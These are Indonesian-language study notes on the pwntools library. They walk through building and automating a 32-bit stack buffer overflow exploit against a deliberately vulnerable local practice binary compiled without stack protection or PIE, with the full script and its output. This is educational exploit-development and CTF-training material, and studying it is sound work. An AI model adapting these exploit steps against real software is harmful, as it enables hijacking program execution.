# pwntools — Catatan Belajar

> Bagian dari perjalanan belajar C untuk Cybersecurity (Exploit Development / Security Researcher)

---

## Apa itu pwntools

Library Python untuk membuat exploit secara profesional. Dipakai di semua CTF dan security research. Menggantikan cara manual yang rumit dengan kode yang bersih dan powerful.

---

## Install

```bash
sudo apt install python3-pwntools -y
```

Konfirmasi:

```bash
python3 -c "from pwn import *; print('pwntools OK')"
```

---

## Perbandingan Cara Manual vs pwntools

### Cara Manual (sebelum pwntools)

```bash
# Buat payload
python3 -c "import sys; sys.stdout.buffer.write(b'A'*44 + b'\x86\x91\x04\x08')" > payload.bin

# Jalankan exploit
./bof $(cat payload.bin)
```

### Cara pwntools

```python
from pwn import *

payload = b'A' * 44 + p32(0x8049186)
p = process(['./bof', payload])
print(p.recvall())
```

Lebih bersih, lebih mudah dikembangkan, dan ini standar industri.

---

## Fungsi Dasar pwntools

### `p32(alamat)`

Mengubah alamat menjadi 4 byte little endian secara otomatis.

```python
p32(0x8049186)  →  b'\x86\x91\x04\x08'
```

Tanpa pwntools kita harus tulis manual: `b'\x86\x91\x04\x08'`

### `process()`

Menjalankan program lokal.

```python
# Jalankan dengan argumen
p = process(['./bof', payload])

# Jalankan tanpa argumen
p = process('./bof')
```

### `p.recvline()`

Terima satu baris output dari program.

```python
line = p.recvline()
# → b'Alamat rahasia: 0x8049186\n'
```

### `p.recvall()`

Terima semua output dari program sampai selesai.

```python
output = p.recvall()
```

### `p.sendline()`

Kirim input ke program lewat stdin.

```python
p.sendline(payload)
```

### `log.success()` dan `log.info()`

Cetak pesan dengan format yang rapi.

```python
log.success(f"Alamat ditemukan: {hex(alamat)}")  # [+] hijau
log.info(f"Payload siap: {len(payload)} byte")   # [*] biru
```

---

## Exploit Lengkap — Otomatis

```python
from pwn import *

# Langkah 1 — jalankan program untuk baca alamat
p = process('./bof')
line = p.recvline()
alamat = int(line.split(b': ')[1], 16)
log.success(f"Alamat rahasia ditemukan: {hex(alamat)}")
p.close()

# Langkah 2 — buat payload dengan alamat yang sudah dibaca
payload = b'A' * 44 + p32(alamat)
log.info(f"Payload siap, panjang: {len(payload)} byte")

# Langkah 3 — jalankan exploit
p = process(['./bof', payload])
output = p.recvall()
for line in output.split(b'\n'):
    if line:
        print(line.decode('latin1'))
```

### Output

```
[+] Alamat rahasia ditemukan: 0x8049186
[*] Payload siap, panjang: 48 byte
BERHASIL! Kamu mengendalikan eksekusi!
```

---

## Penjelasan Baris Penting

### Membaca alamat dari output program

```python
line = p.recvline()
# line = b'Alamat rahasia: 0x8049186\n'

alamat = int(line.split(b': ')[1], 16)
# split(b': ')  → [b'Alamat rahasia', b'0x8049186\n']
# [1]           → b'0x8049186\n'
# int(..., 16)  → 134517126  (desimal dari hex)
```

### Merapikan output

```python
for line in output.split(b'\n'):
    if line:
        print(line.decode('latin1'))

# split(b'\n')     → potong per baris baru
# if line          → skip baris kosong
# .decode('latin1') → ubah bytes jadi teks
```

---

## Setup Ulang di Kali Baru

```bash
# Install semua yang dibutuhkan sekaligus
sudo apt install gcc gdb gcc-multilib python3-pwntools -y

# Compile program vulnerable
gcc bof.c -o bof -fno-stack-protector -no-pie -m32
```

---

## Selanjutnya

- [ ] Bypass proteksi modern — ASLR, NX, stack canary
- [ ] CTF pertama — picoCTF / pwn.college
- [ ] Remote exploit — attack program lewat network
